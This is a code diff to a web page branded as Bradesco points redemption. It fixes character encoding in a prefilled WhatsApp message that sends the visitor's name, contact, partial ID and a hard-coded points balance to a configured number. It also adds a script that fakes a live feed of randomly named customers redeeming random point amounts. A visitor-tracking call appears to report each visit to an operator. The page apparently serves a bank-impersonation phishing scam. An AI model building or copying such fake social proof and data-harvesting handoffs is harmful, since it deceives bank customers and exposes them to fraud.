     function openWhatsapp() {
       const message = [
-        "OlÃƒÂ¡, gostaria de prosseguir com o atendimento de resgate de pontos.",
-        `Tipo de cliente: ${state.cliente || "nÃƒÂ£o informado"}`,
-        `Nome/RazÃƒÂ£o social: ${state.nomeCliente || "nÃƒÂ£o informado"}`,
-        `Contato: ${state.contato || "nÃƒÂ£o informado"}`,
-        `IdentificaÃƒÂ§ÃƒÂ£o parcial/protocolo: ${state.identificadorSeguro || "nÃƒÂ£o informado"}`,
-        `Perfil: ${state.segmento || "nÃƒÂ£o informado"}`,
-        `Categoria de resgate: ${state.categoria || "nÃƒÂ£o informado"}`,
+        "Olá, gostaria de prosseguir com o atendimento de resgate de pontos.",
+        `Tipo de cliente: ${state.cliente || "não informado"}`,
+        `Nome/Razão social: ${state.nomeCliente || "não informado"}`,
+        `Contato: ${state.contato || "não informado"}`,
+        `Identificação parcial/protocolo: ${state.identificadorSeguro || "não informado"}`,
+        `Perfil: ${state.segmento || "não informado"}`,
+        `Categoria de resgate: ${state.categoria || "não informado"}`,
         "Pontos consultados: 38.982",
-        "ObservaÃƒÂ§ÃƒÂ£o: nÃƒÂ£o estou enviando agÃƒÂªncia, conta, senha, token, CVV ou documentos completos por este canal."
+        "Observação: não estou enviando agência, conta, senha, token, CVV ou documentos completos por este canal."
       ].join("\n");
 
       window.location.href = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
@@ -1587,6 +1975,74 @@
 
     updateQuiz();
     BradescoRealtime.connectVisitor(document.title || 'Pagina acessada');
+  </script>
+  <script>
+    (function() {
+      const whatsappButton = document.querySelector('.whatsapp-float');
+      const faqSection = document.querySelector('#faq');
+      if (!whatsappButton || !faqSection) return;
+
+      function toggleWhatsappButton() {
+        const triggerPoint = faqSection.offsetTop - window.innerHeight * 0.45;
+        whatsappButton.classList.toggle('show', window.scrollY >= triggerPoint);
+      }
+
+      window.addEventListener('scroll', toggleWhatsappButton, { passive: true });
+      window.addEventListener('resize', toggleWhatsappButton);
+      toggleWhatsappButton();
+    })();
+  </script>
+  <script>
+    (function() {
+      const feed = document.querySelector('#redemptionFeed');
+      if (!feed) return;
+
+      const names = [
+        'Maria', 'João', 'Ana', 'Carlos', 'Fernanda', 'Lucas',
+        'Juliana', 'Rafael', 'Patrícia', 'Marcos', 'Camila', 'Bruno'
+      ];
+      const actions = [
+        'resgatou agora',
+        'está resgatando agora',
+        'acabou de consultar',
+        'iniciou um resgate de'
+      ];
+
+      function randomItem(list) {
+        return list[Math.floor(Math.random() * list.length)];
+      }
+
+      function randomPoints() {
+        const value = Math.floor(12000 + Math.random() * 68000);
+        return value.toLocaleString('pt-BR');
+      }
+
+      function showRedemptionToast() {
+        const toast = document.createElement('div');
+        const name = randomItem(names);
+        const action = randomItem(actions);
+        const points = randomPoints();
+        toast.className = 'redemption-toast';
+        toast.innerHTML = `
+          <small>Bradesco Pontos</small>
+          <strong>${name} ${action} ${points} pontos</strong>
+          <span>Atualizado há poucos minutos</span>
+        `;
+
+        feed.appendChild(toast);
+        while (feed.children.length > 2) {
+          feed.firstElementChild.remove();
+        }
+
+        setTimeout(() => {
+          toast.classList.add('hide');
+          setTimeout(() => toast.remove(), 300);
+        }, 5200);
+      }
+
+      setTimeout(showRedemptionToast, 1800);
+      setInterval(showRedemptionToast, 20000);
+    })();
   </script>
 </body>
 </html>
